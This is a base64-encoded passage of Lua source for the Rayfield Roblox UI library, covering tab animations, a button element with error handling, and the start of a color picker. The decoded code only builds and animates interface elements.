gkJdGFzay53YWl0KDAuMSkKCQlpZiBGaXJzdFRhYiBvciBFeHQgdGhlbgoJCQlUYWJCdXR0b24uQmFja2dyb3VuZENvbG9yMyA9IFNlbGVjdGVkVGhlbWUuVGFiQmFja2dyb3VuZAoJCQlUYWJCdXR0b24uSW1hZ2UuSW1hZ2VDb2xvcjMgPSBTZWxlY3RlZFRoZW1lLlRhYlRleHRDb2xvcgoJCQlUYWJCdXR0b24uVGl0bGUuVGV4dENvbG9yMyA9IFNlbGVjdGVkVGhlbWUuVGFiVGV4dENvbG9yCgkJCVR3ZWVuU2VydmljZTpDcmVhdGUoVGFiQnV0dG9uLCBUd2VlbkluZm8ubmV3KDAuNywgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMC43fSk6UGxheSgpCgkJCVR3ZWVuU2VydmljZTpDcmVhdGUoVGFiQnV0dG9uLlRpdGxlLCBUd2VlbkluZm8ubmV3KDAuNywgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtUZXh0VHJhbnNwYXJlbmN5ID0gMC4yfSk6UGxheSgpCgkJCVR3ZWVuU2VydmljZTpDcmVhdGUoVGFiQnV0dG9uLkltYWdlLCBUd2VlbkluZm8ubmV3KDAuNywgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtJbWFnZVRyYW5zcGFyZW5jeSA9IDAuMn0pOlBsYXkoKQoJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKFRhYkJ1dHRvbi5VSVN0cm9rZSwgVHdlZW5JbmZvLm5ldygwLjcsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7VHJhbnNwYXJlbmN5ID0gMC41fSk6UGxheSgpCgkJZWxzZWlmIG5vdCBFeHQgdGhlbgoJCQlGaXJzdFRhYiA9IE5hbWUKCQkJVGFiQnV0dG9uLkJhY2tncm91bmRDb2xvcjMgPSBTZWxlY3RlZFRoZW1lLlRhYkJhY2tncm91bmRTZWxlY3RlZAoJCQlUYWJCdXR0b24uSW1hZ2UuSW1hZ2VDb2xvcjMgPSBTZWxlY3RlZFRoZW1lLlNlbGVjdGVkVGFiVGV4dENvbG9yCgkJCVRhYkJ1dHRvbi5UaXRsZS5UZXh0Q29sb3IzID0gU2VsZWN0ZWRUaGVtZS5TZWxlY3RlZFRhYlRleHRDb2xvcgoJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKFRhYkJ1dHRvbi5JbWFnZSwgVHdlZW5JbmZvLm5ldygwLjcsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7SW1hZ2VUcmFuc3BhcmVuY3kgPSAwfSk6UGxheSgpCgkJCVR3ZWVuU2VydmljZTpDcmVhdGUoVGFiQnV0dG9uLCBUd2VlbkluZm8ubmV3KDAuNywgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMH0pOlBsYXkoKQoJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKFRhYkJ1dHRvbi5UaXRsZSwgVHdlZW5JbmZvLm5ldygwLjcsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7VGV4dFRyYW5zcGFyZW5jeSA9IDB9KTpQbGF5KCkKCQllbmQKCgoJCVRhYkJ1dHRvbi5JbnRlcmFjdC5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkKCQkJaWYgTWluaW1pc2VkIHRoZW4gcmV0dXJuIGVuZAoJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKFRhYkJ1dHRvbiwgVHdlZW5JbmZvLm5ldygwLjcsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7QmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDB9KTpQbGF5KCkKCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShUYWJCdXR0b24uVUlTdHJva2UsIFR3ZWVuSW5mby5uZXcoMC43LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1RyYW5zcGFyZW5jeSA9IDF9KTpQbGF5KCkKCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShUYWJCdXR0b24uVGl0bGUsIFR3ZWVuSW5mby5uZXcoMC43LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1RleHRUcmFuc3BhcmVuY3kgPSAwfSk6UGxheSgpCgkJCVR3ZWVuU2VydmljZTpDcmVhdGUoVGFiQnV0dG9uLkltYWdlLCBUd2VlbkluZm8ubmV3KDAuNywgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtJbWFnZVRyYW5zcGFyZW5jeSA9IDB9KTpQbGF5KCkKCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShUYWJCdXR0b24sIFR3ZWVuSW5mby5uZXcoMC43LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge0JhY2tncm91bmRDb2xvcjMgPSBTZWxlY3RlZFRoZW1lLlRhYkJhY2tncm91bmRTZWxlY3RlZH0pOlBsYXkoKQoJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKFRhYkJ1dHRvbi5UaXRsZSwgVHdlZW5JbmZvLm5ldygwLjcsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7VGV4dENvbG9yMyA9IFNlbGVjdGVkVGhlbWUuU2VsZWN0ZWRUYWJUZXh0Q29sb3J9KTpQbGF5KCkKCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShUYWJCdXR0b24uSW1hZ2UsIFR3ZWVuSW5mby5uZXcoMC43LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge0ltYWdlQ29sb3IzID0gU2VsZWN0ZWRUaGVtZS5TZWxlY3RlZFRhYlRleHRDb2xvcn0pOlBsYXkoKQoKCQkJZm9yIF8sIE90aGVyVGFiQnV0dG9uIGluIGlwYWlycyhUYWJMaXN0OkdldENoaWxkcmVuKCkpIGRvCgkJCQlpZiBPdGhlclRhYkJ1dHRvbi5OYW1lIH49ICJUZW1wbGF0ZSIgYW5kIE90aGVyVGFiQnV0dG9uLkNsYXNzTmFtZSA9PSAiRnJhbWUiIGFuZCBPdGhlclRhYkJ1dHRvbiB+PSBUYWJCdXR0b24gYW5kIE90aGVyVGFiQnV0dG9uLk5hbWUgfj0gIlBsYWNlaG9sZGVyIiB0aGVuCgkJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShPdGhlclRhYkJ1dHRvbiwgVHdlZW5JbmZvLm5ldygwLjcsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7QmFja2dyb3VuZENvbG9yMyA9IFNlbGVjdGVkVGhlbWUuVGFiQmFja2dyb3VuZH0pOlBsYXkoKQoJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoT3RoZXJUYWJCdXR0b24uVGl0bGUsIFR3ZWVuSW5mby5uZXcoMC43LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1RleHRDb2xvcjMgPSBTZWxlY3RlZFRoZW1lLlRhYlRleHRDb2xvcn0pOlBsYXkoKQoJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoT3RoZXJUYWJCdXR0b24uSW1hZ2UsIFR3ZWVuSW5mby5uZXcoMC43LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge0ltYWdlQ29sb3IzID0gU2VsZWN0ZWRUaGVtZS5UYWJUZXh0Q29sb3J9KTpQbGF5KCkKCQkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKE90aGVyVGFiQnV0dG9uLCBUd2VlbkluZm8ubmV3KDAuNywgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMC43fSk6UGxheSgpCgkJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShPdGhlclRhYkJ1dHRvbi5UaXRsZSwgVHdlZW5JbmZvLm5ldygwLjcsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7VGV4dFRyYW5zcGFyZW5jeSA9IDAuMn0pOlBsYXkoKQoJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoT3RoZXJUYWJCdXR0b24uSW1hZ2UsIFR3ZWVuSW5mby5uZXcoMC43LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge0ltYWdlVHJhbnNwYXJlbmN5ID0gMC4yfSk6UGxheSgpCgkJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShPdGhlclRhYkJ1dHRvbi5VSVN0cm9rZSwgVHdlZW5JbmZvLm5ldygwLjcsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7VHJhbnNwYXJlbmN5ID0gMC41fSk6UGxheSgpCgkJCQllbmQKCQkJZW5kCgoJCQlpZiBFbGVtZW50cy5VSVBhZ2VMYXlvdXQuQ3VycmVudFBhZ2Ugfj0gVGFiUGFnZSB0aGVuCgkJCQlFbGVtZW50cy5VSVBhZ2VMYXlvdXQ6SnVtcFRvKFRhYlBhZ2UpCgkJCWVuZAoJCWVuZCkKCgkJbG9jYWwgVGFiID0ge30KCgkJLS0gQnV0dG9uCgkJZnVuY3Rpb24gVGFiOkNyZWF0ZUJ1dHRvbihCdXR0b25TZXR0aW5ncykKCQkJbG9jYWwgQnV0dG9uVmFsdWUgPSB7fQoKCQkJbG9jYWwgQnV0dG9uID0gRWxlbWVudHMuVGVtcGxhdGUuQnV0dG9uOkNsb25lKCkKCQkJQnV0dG9uLk5hbWUgPSBCdXR0b25TZXR0aW5ncy5OYW1lCgkJCUJ1dHRvbi5UaXRsZS5UZXh0ID0gQnV0dG9uU2V0dGluZ3MuTmFtZQoJCQlCdXR0b24uVmlzaWJsZSA9IHRydWUKCQkJQnV0dG9uLlBhcmVudCA9IFRhYlBhZ2UKCgkJCUJ1dHRvbi5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQoJCQlCdXR0b24uVUlTdHJva2UuVHJhbnNwYXJlbmN5ID0gMQoJCQlCdXR0b24uVGl0bGUuVGV4dFRyYW5zcGFyZW5jeSA9IDEKCgkJCVR3ZWVuU2VydmljZTpDcmVhdGUoQnV0dG9uLCBUd2VlbkluZm8ubmV3KDAuNywgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMH0pOlBsYXkoKQoJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKEJ1dHRvbi5VSVN0cm9rZSwgVHdlZW5JbmZvLm5ldygwLjcsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7VHJhbnNwYXJlbmN5ID0gMH0pOlBsYXkoKQoJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKEJ1dHRvbi5UaXRsZSwgVHdlZW5JbmZvLm5ldygwLjcsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7VGV4dFRyYW5zcGFyZW5jeSA9IDB9KTpQbGF5KCkJCgoKCQkJQnV0dG9uLkludGVyYWN0Lk1vdXNlQnV0dG9uMUNsaWNrOkNvbm5lY3QoZnVuY3Rpb24oKQoJCQkJbG9jYWwgU3VjY2VzcywgUmVzcG9uc2UgPSBwY2FsbChCdXR0b25TZXR0aW5ncy5DYWxsYmFjaykKCQkJCWlmIG5vdCBTdWNjZXNzIHRoZW4KCQkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKEJ1dHRvbiwgVHdlZW5JbmZvLm5ldygwLjYsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7QmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDg1LCAwLCAwKX0pOlBsYXkoKQoJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoQnV0dG9uLkVsZW1lbnRJbmRpY2F0b3IsIFR3ZWVuSW5mby5uZXcoMC42LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1RleHRUcmFuc3BhcmVuY3kgPSAxfSk6UGxheSgpCgkJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShCdXR0b24uVUlTdHJva2UsIFR3ZWVuSW5mby5uZXcoMC42LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1RyYW5zcGFyZW5jeSA9IDF9KTpQbGF5KCkKCQkJCQlCdXR0b24uVGl0bGUuVGV4dCA9ICJDYWxsYmFjayBFcnJvciIKCQkJCQlwcmludCgiUmF5ZmllbGQgfCAiLi5CdXR0b25TZXR0aW5ncy5OYW1lLi4iIENhbGxiYWNrIEVycm9yICIgLi50b3N0cmluZyhSZXNwb25zZSkpCgkJCQkJd2FybignQ2hlY2sgZG9jcy5zaXJpdXMubWVudSBmb3IgaGVscCB3aXRoIFJheWZpZWxkIHNwZWNpZmljIGRldmVsb3BtZW50LicpCgkJCQkJdGFzay53YWl0KDAuNSkKCQkJCQlCdXR0b24uVGl0bGUuVGV4dCA9IEJ1dHRvblNldHRpbmdzLk5hbWUKCQkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKEJ1dHRvbiwgVHdlZW5JbmZvLm5ldygwLjYsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7QmFja2dyb3VuZENvbG9yMyA9IFNlbGVjdGVkVGhlbWUuRWxlbWVudEJhY2tncm91bmR9KTpQbGF5KCkKCQkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKEJ1dHRvbi5FbGVtZW50SW5kaWNhdG9yLCBUd2VlbkluZm8ubmV3KDAuNiwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtUZXh0VHJhbnNwYXJlbmN5ID0gMC45fSk6UGxheSgpCgkJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShCdXR0b24uVUlTdHJva2UsIFR3ZWVuSW5mby5uZXcoMC42LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1RyYW5zcGFyZW5jeSA9IDB9KTpQbGF5KCkKCQkJCWVsc2UKCQkJCQlpZiBub3QgQnV0dG9uU2V0dGluZ3MuRXh0IHRoZW4KCQkJCQkJU2F2ZUNvbmZpZ3VyYXRpb24oQnV0dG9uU2V0dGluZ3MuTmFtZS4uJ1xuJykKCQkJCQllbmQKCQkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKEJ1dHRvbiwgVHdlZW5JbmZvLm5ldygwLjYsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7QmFja2dyb3VuZENvbG9yMyA9IFNlbGVjdGVkVGhlbWUuRWxlbWVudEJhY2tncm91bmRIb3Zlcn0pOlBsYXkoKQoJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoQnV0dG9uLkVsZW1lbnRJbmRpY2F0b3IsIFR3ZWVuSW5mby5uZXcoMC42LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1RleHRUcmFuc3BhcmVuY3kgPSAxfSk6UGxheSgpCgkJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShCdXR0b24uVUlTdHJva2UsIFR3ZWVuSW5mby5uZXcoMC42LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1RyYW5zcGFyZW5jeSA9IDF9KTpQbGF5KCkKCQkJCQl0YXNrLndhaXQoMC4yKQoJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoQnV0dG9uLCBUd2VlbkluZm8ubmV3KDAuNiwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtCYWNrZ3JvdW5kQ29sb3IzID0gU2VsZWN0ZWRUaGVtZS5FbGVtZW50QmFja2dyb3VuZH0pOlBsYXkoKQoJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoQnV0dG9uLkVsZW1lbnRJbmRpY2F0b3IsIFR3ZWVuSW5mby5uZXcoMC42LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1RleHRUcmFuc3BhcmVuY3kgPSAwLjl9KTpQbGF5KCkKCQkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKEJ1dHRvbi5VSVN0cm9rZSwgVHdlZW5JbmZvLm5ldygwLjYsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7VHJhbnNwYXJlbmN5ID0gMH0pOlBsYXkoKQoJCQkJZW5kCgkJCWVuZCkKCgkJCUJ1dHRvbi5Nb3VzZUVudGVyOkNvbm5lY3QoZnVuY3Rpb24oKQoJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShCdXR0b24sIFR3ZWVuSW5mby5uZXcoMC42LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge0JhY2tncm91bmRDb2xvcjMgPSBTZWxlY3RlZFRoZW1lLkVsZW1lbnRCYWNrZ3JvdW5kSG92ZXJ9KTpQbGF5KCkKCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoQnV0dG9uLkVsZW1lbnRJbmRpY2F0b3IsIFR3ZWVuSW5mby5uZXcoMC42LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1RleHRUcmFuc3BhcmVuY3kgPSAwLjd9KTpQbGF5KCkKCQkJZW5kKQoKCQkJQnV0dG9uLk1vdXNlTGVhdmU6Q29ubmVjdChmdW5jdGlvbigpCgkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKEJ1dHRvbiwgVHdlZW5JbmZvLm5ldygwLjYsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7QmFja2dyb3VuZENvbG9yMyA9IFNlbGVjdGVkVGhlbWUuRWxlbWVudEJhY2tncm91bmR9KTpQbGF5KCkKCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoQnV0dG9uLkVsZW1lbnRJbmRpY2F0b3IsIFR3ZWVuSW5mby5uZXcoMC42LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1RleHRUcmFuc3BhcmVuY3kgPSAwLjl9KTpQbGF5KCkKCQkJZW5kKQoKCQkJZnVuY3Rpb24gQnV0dG9uVmFsdWU6U2V0KE5ld0J1dHRvbikKCQkJCUJ1dHRvbi5UaXRsZS5UZXh0ID0gTmV3QnV0dG9uCgkJCQlCdXR0b24uTmFtZSA9IE5ld0J1dHRvbgoJCQllbmQKCgkJCXJldHVybiBCdXR0b25WYWx1ZQoJCWVuZAoKCQktLSBDb2xvclBpY2tlcgoJCWZ1bmN0aW9uIFRhYjpDcmVhdGVDb2xvclBpY2tlcihDb2xvclBpY2tlclNldHRpbmdzKSAtLSBieSBUaHJvaXQKCQkJQ29sb3JQaWNrZXJTZXR0aW5ncy5UeXBlID0gIkNvbG9yUGlja2VyIgoJCQlsb2NhbCBDb2xvclBpY2tlciA9IEVsZW1lbnRzLlRlbXBsYXRlLkNvbG9yUGlja2VyOkNsb25lKCkKCQkJbG9jYWwgQmFja2dyb3VuZCA9IENvbG9yUGlja2VyLkNQQmFja2dyb3VuZAoJCQlsb2NhbCBEaXNwbGF5ID0gQmFja2dyb3VuZC5EaXNwbGF5CgkJCWxvY2FsIE1haW4gPSBCYWNrZ3JvdW5kLk1haW5DUAoJCQlsb2NhbCBTbGlkZXIgPSBDb2xvclBpY2tlci5Db2xvclNsaWRlcgoJCQlDb2xvclBpY2tlci5DbGlwc0Rlc2NlbmRhbnRzID0gdHJ1ZQoJCQlDb2xvclBpY2tlci5OYW1lID0gQ29sb3JQaWNrZXJTZXR0aW5ncy5OYW1lCgkJCUNvbG9yUGlja2VyLlRpdGxlLlRleHQgPSBDb2xvclBpY2tlclNldHRpbmdzLk5hbWUKCQkJQ29sb3JQaWNrZXIuVmlzaWJsZSA9IHRydWUKCQkJQ29sb3JQaWNrZXIuUGFyZW50ID0gVGFiUGFnZQoJCQlDb2xvclBpY2tlci5TaXplID0gVURpbTIubmV3KDEsIC0xMCwgMCwgNDUpCgkJCUJhY2tncm91bmQuU2l6ZSA9IFVEaW0yLm5ldygwLCAzOSwgMCwgMjIpCgkJCURpc3BsYXkuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDAKCQkJTWFpbi5NYWluUG9pbnQuSW1hZ2VUcmFuc3BhcmVuY3kgPSAxCgkJCUNvbG9yUGlja2VyLkludGVyYWN0LlNpemUgPSBVRGltMi5uZXcoMSwgMCwgMSwgMCkKCQkJQ29sb3JQaWNrZXIuSW50ZXJhY3QuUG9zaXRpb24gPSBVRGltMi5uZXcoMC41LCAwLCAwLjUsIDApCgkJCUNvbG9yUGlja2VyLlJHQi5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLCAxNywgMCwgNzApCgkJCUNvbG9yUGlja2VyLkhleElucHV0LlBvc2l0aW9uID0gVURpbTIubmV3KDAsIDE3LCAwLCA5MCkKCQkJTWFpbi5JbWFnZVRyYW5zcGFyZW5jeSA9IDEKCQkJQmFja2dyb3VuZC5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQoKCQkJZm9yIF8sIHJnYmlucHV0IGluIGlwYWlycyhDb2xvclBpY2tlci5SR0I6R2V0Q2hpbGRyZW4oKSkgZG8KCQkJCWlmIHJnYmlucHV0OklzQSgiRnJhbWUiKSB0aGVuCgkJCQkJcmdiaW5wdXQuQmFja2dyb3VuZENvbG9yMyA9IFNlbGVjdGVkVGhlbWUuSW5wdXRCYWNrZ3JvdW5kCgkJCQkJcmdiaW5wdXQuVUlTdHJva2UuQ29sb3IgPSBTZWxlY3RlZFRoZW1lLklucHV0U3Ryb2tlCgkJCQllbmQKCQkJZW5kCgoJCQlDb2xvclBpY2tlci5IZXhJbnB1dC5CYWNrZ3JvdW5kQ29sb3IzID0gU2VsZWN0ZWRUaGVtZS5JbnB1dEJhY2tncm91bmQKCQkJQ29sb3JQaWNrZXIuSGV4SW5wdXQuVUlTdHJva2UuQ29sb3IgPSBTZWxlY3RlZFRoZW1lLklucHV0U3Ryb2tlCgoJCQlsb2NhbCBvcGVuZWQgPSBmYWxzZSAKCQkJbG9jYWwgbW91c2UgPSBQbGF5ZXJzLkxvY2FsUGxheWVyOkdldE1vdXNlKCkKCQkJTWFpbi5JbWFnZSA9ICJodHRwOi8vd3d3LnJvYmxveC5jb20vYXNzZXQvP2lkPTExNDE1NjQ1NzM5IgoJCQlsb2NhbCBtYWluRHJhZ2dpbmcgPSBmYWxzZSAKCQkJbG9jYWwgc2xpZGVyRHJhZ2dpbmcgPSBmYWxzZSAKCQkJQ29sb3JQaWNrZXIuSW50ZXJhY3QuTW91c2VCdXR0b24xRG93bjpDb25uZWN0KGZ1bmN0aW9uKCkKCQkJCXRhc2suc3Bhd24oZnVuY3Rpb24oKQoJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoQ29sb3JQaWNrZXIsIFR3ZWVuSW5mby5uZXcoMC42LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge0JhY2tncm91bmRDb2xvcjMgPSBTZWxlY3RlZFRoZW1lLkVsZW1lbnRCYWNrZ3JvdW5kSG92ZXJ9KTpQbGF5KCkKCQkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKENvbG9yUGlja2VyLlVJU3Ryb2tlLCBUd2VlbkluZm8ubmV3KDAuNiwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtUcmFuc3BhcmVuY3kgPSAxfSk6UGxheSgpCgkJCQkJdGFzay53YWl0KDAuMikKCQkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKENvbG9yUGlja2VyLCBUd2VlbkluZm8ubmV3KDAuNiwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtCYWNrZ3JvdW5kQ29sb3IzID0gU2VsZWN0ZWRUaGVtZS5FbGVtZW50QmFja2dyb3VuZH0pOlBsYXkoKQoJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoQ29sb3JQaWNrZXIuVUlTdHJva2UsIFR3ZWVuSW5mby5uZXcoMC42LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1RyYW5zcGFyZW5jeSA9IDB9KTpQbGF5KCkKCQkJCWVuZCkKCgkJCQlpZiBub3Qgb3BlbmVkIHRoZW4KCQkJCQlvcGVuZWQgPSB0cnVlIAoJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoQmFja2dyb3VuZCwgVHdlZW5JbmZvLm5ldygwLjQ1LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1NpemUgPSBVRGltMi5uZXcoMCwgMTgsIDAsIDE1KX0pOlBsYXkoKQoJCQkJCXRhc2sud2FpdCgwLjEpCgkJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShDb2xvclBpY2tlciwgVHdlZW5JbmZvLm5ldygwLjYsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7U2l6ZSA9IFVEaW0yLm5ldygxLCAtMTAsIDAsIDEyMCl9KTpQbGF5KCkKCQkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKEJhY2tncm91bmQsIFR3ZWVuSW5mby5uZXcoMC42LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1NpemUgPSBVRGltMi5uZXcoMCwgMTczLCAwLCA4Nil9KTpQbGF5KCkKCQkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKERpc3BsYXksIFR3ZWVuSW5mby5uZXcoMC42LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge0JhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxfSk6UGxheSgpCgkJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShDb2xvclBpY2tlci5JbnRlcmFjdCwgVHdlZW5JbmZvLm5ldygwLjYsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7UG9zaXRpb24gPSBVRGltMi5uZXcoMC4yODksIDAsIDAuNSwgMCl9KTpQbGF5KCkKCQkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKENvbG9yUGlja2VyLlJHQiwgVHdlZW5JbmZvLm5ldygwLjgsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7UG9zaXRpb24gPSBVRGltMi5uZXcoMCwgMTcsIDAsIDQwKX0pOlBsYXkoKQoJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoQ29sb3JQaWNrZXIuSGV4SW5wdXQsIFR3ZWVuSW5mby5uZXcoMC41LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1Bvc2l0aW9uID0gVURpbTIubmV3KDAsIDE3LCAwLCA3Myl9KTpQbGF5KCkKCQkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKENvbG9yUGlja2VyLkludGVyYWN0LCBUd2VlbkluZm8ubmV3KDAuNiwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtTaXplID0gVURpbTIubmV3KDAuNTc0LCAwLCAxLCAwKX0pOlBsYXkoKQoJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoTWFpbi5NYWluUG9pbnQsIFR3ZWVuSW5mby5uZXcoMC4yLCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge0ltYWdlVHJhbnNwYXJlbmN5ID0gMH0pOlBsYXkoKQoJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoTWFpbiwgVHdlZW5JbmZvLm5ldygwLjIsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7SW1hZ2VUcmFuc3BhcmVuY3kgPSBTZWxlY3RlZFRoZW1lIH49IFJheWZpZWxkTGlicmFyeS5UaGVtZS5EZWZhdWx0IGFuZCAwLjI1IG9yIDAuMX0pOlBsYXkoKQoJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoQmFja2dyb3VuZCwgVHdlZW5JbmZvLm5ldygwLjYsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7QmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDB9KTpQbGF5KCkKCQkJCWVsc2UKCQkJCQlvcGVuZWQgPSBmYWxzZQoJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoQ29sb3JQaWNrZXIsIFR3ZWVuSW5mby5uZXcoMC42LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1NpemUgPSBVRGltMi5uZXcoMSwgLTEwLCAwLCA0NSl9KTpQbGF5KCkKCQkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKEJhY2tncm91bmQsIFR3ZWVuSW5mby5uZXcoMC42LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1NpemUgPSBVRGltMi5uZXcoMCwgMzksIDAsIDIyKX0pOlBsYXkoKQoJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoQ29sb3JQaWNrZXIuSW50ZXJhY3QsIFR3ZWVuSW5mby5uZXcoMC42LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1NpemUgPSBVRGltMi5uZXcoMSwgMCwgMSwgMCl9KTpQbGF5KCkKCQkJCQlUd2VlblNl